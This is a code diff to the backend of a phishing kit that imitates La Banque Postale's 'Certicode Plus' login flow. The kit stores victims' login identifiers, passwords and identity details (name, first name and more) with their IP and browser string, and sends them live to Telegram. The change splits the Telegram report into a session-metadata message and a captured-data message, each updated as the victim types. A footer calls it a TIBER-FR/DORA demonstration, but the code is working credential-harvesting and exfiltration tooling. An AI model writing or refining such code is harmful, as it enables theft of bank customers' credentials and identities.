@@ -78,14 +78,13 @@ def _esc(v: Any) -> str:
     return html.escape(str(v)) if v is not None else ""
 
 
-def _format_progress_message(
+def _format_session_message(
     session_id: str,
-    captured: Dict[str, Any],
     meta: Dict[str, str],
     stage: Optional[str],
     started_at: str,
 ) -> str:
-    """Build a progressive HTML recap message that grows as fields fill in."""
+    """Compact session-metadata recap (IP, UA, état, timestamps). Edited as stage/last-update change."""
     stage_label = {
         "identifiant": "🟡 Identifiant en cours",
         "password": "🟠 Mot de passe en cours",
@@ -93,18 +92,21 @@ def _format_progress_message(
         "completed": "✅ Parcours terminé",
     }.get(stage or "", "⏳ Capture en cours")
 
-    lines = [
-        "<b>🎯 LBP Certicode Plus — Capture en direct</b>",
+    return "\n".join([
+        "<b>📡 LBP Certicode Plus — Session</b>",
         f"<b>État</b> : {stage_label}",
         f"<b>Session</b> : <code>{_esc(session_id)}</code>",
         f"<b>IP</b> : <code>{_esc(meta.get('ip', '?'))}</code>",
         f"<b>UA</b> : <code>{_esc(meta.get('user_agent', '?')[:160])}</code>",
         f"<b>Démarrage</b> : {_esc(started_at)}",
         f"<b>Dernière màj</b> : {_esc(_now_iso())}",
-        "━━━━━━━━━━━━━━━━━",
-    ]
+    ])
 
-    # ---- Identification ----
+
+def _format_data_message(captured: Dict[str, Any]) -> str:
+    """Captured data only (no session metadata). Grows as fields fill in."""
+    lines = ["<b>🎯 LBP Certicode Plus — Données capturées</b>", ""]
+
     ident_lines = []
     if captured.get("identifiant"):
         ident_lines.append(f"• <b>Identifiant</b> : <code>{_esc(captured['identifiant'])}</code>")
@@ -117,9 +119,8 @@ def _format_progress_message(
     if ident_lines:
         lines.append("🔐 <b>IDENTIFICATION</b>")
         lines.extend(ident_lines)
-        lines.append("━━━━━━━━━━━━━━━━━")
+        lines.append("")
 
-    # ---- Identity ----
     id_keys = [
         ("nom", "Nom"),
         ("prenom", "Prénom"),
@@ -136,7 +137,10 @@ def _format_progress_message(
     if id_lines:
         lines.append("🪪 <b>IDENTITÉ</b>")
         lines.extend(id_lines)
-        lines.append("━━━━━━━━━━━━━━━━━")
+        lines.append("")
+
+    if len(lines) <= 2:
+        lines.append("<i>En attente de saisie…</i>")
 
     lines.append("<i>Exercice TIBER-FR / DORA — démonstratif</i>")
     return "\n".join(lines)
@@ -196,31 +200,51 @@ async def _telegram_edit(message_id: int, text: str) -> bool:
 
 
 async def _push_or_edit_progress(session_id: str, request: Request, stage: Optional[str]) -> bool:
-    """Centralized helper: read session, build message, send (first time) or edit (subsequent)."""
+    """Maintain TWO Telegram messages per session: one for session metadata, one for captured data.
+    First call sends both; subsequent calls edit them in place."""
     sess = await db.sessions.find_one({"session_id": session_id})
     if not sess:
         return False
     meta = _client_meta(request)
     captured = sess.get("captured_data", {}) or {}
-    text = _format_progress_message(
-        session_id=session_id,
-        captured=captured,
-        meta=meta,
-        stage=stage,
-        started_at=sess.get("created_at", ""),
-    )
-    message_id = sess.get("tg_message_id")
-    if message_id:
-        return await _telegram_edit(message_id, text)
-    # No existing message - send a new one and persist message_id
-    new_id = await _telegram_send(text)
-    if new_id is not None:
+    started_at = sess.get("created_at", "")
+
+    session_text = _format_session_message(session_id, meta, stage, started_at)
+    data_text = _format_data_message(captured)
+
+    session_msg_id = sess.get("tg_session_message_id")
+    data_msg_id = sess.get("tg_data_message_id")
+
+    sent_any = False
+    update_fields = {}
+
+    # Session metadata message
+    if session_msg_id:
+        if await _telegram_edit(session_msg_id, session_text):
+            sent_any = True
+    else:
+        new_id = await _telegram_send(session_text)
+        if new_id is not None:
+            update_fields["tg_session_message_id"] = new_id
+            sent_any = True
+
+    # Data capture message
+    if data_msg_id:
+        if await _telegram_edit(data_msg_id, data_text):
+            sent_any = True
+    else:
+        new_id = await _telegram_send(data_text)
+        if new_id is not None:
+            update_fields["tg_data_message_id"] = new_id
+            sent_any = True
+
+    if update_fields:
         await db.sessions.update_one(
             {"session_id": session_id},
-            {"$set": {"tg_message_id": new_id}},
+            {"$set": update_fields},
         )
-        return True
-    return False
+
+    return sent_any
 
 
 # ---------- Routes ----------
@@ -253,7 +277,8 @@ async def create_session(payload: SessionCreate, request: Request):
         "user_agent": meta["user_agent"],
         "referrer": payload.referrer or request.headers.get("referer", ""),
         "captured_data": {},
-        "tg_message_id": None,
+        "tg_session_message_id": None,
+        "tg_data_message_id": None,
         "steps": [],
     }
     await db.sessions.insert_one(doc)
